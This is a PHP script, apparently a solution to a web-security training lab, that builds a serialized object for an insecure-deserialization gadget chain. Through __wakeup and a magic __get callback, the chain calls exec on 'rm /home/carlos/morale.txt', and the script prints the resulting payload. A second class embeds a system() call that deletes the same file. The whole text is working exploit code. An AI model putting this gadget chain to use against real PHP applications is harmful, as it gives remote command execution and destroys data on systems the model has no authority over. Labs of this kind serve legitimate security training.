<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new DefaultMap("exec");
        $this->default_desc_type = "rm /home/carlos/morale.txt";
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
	    $this->HTML_DESC = '<?php system("rm /home/carlos/morale.txt");?>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
	    echo $name."\n";
        return call_user_func($this->callback, $name);
    }
}
$obj = new CustomTemplate();
$test = serialize($obj);
echo $test."\n";

?>
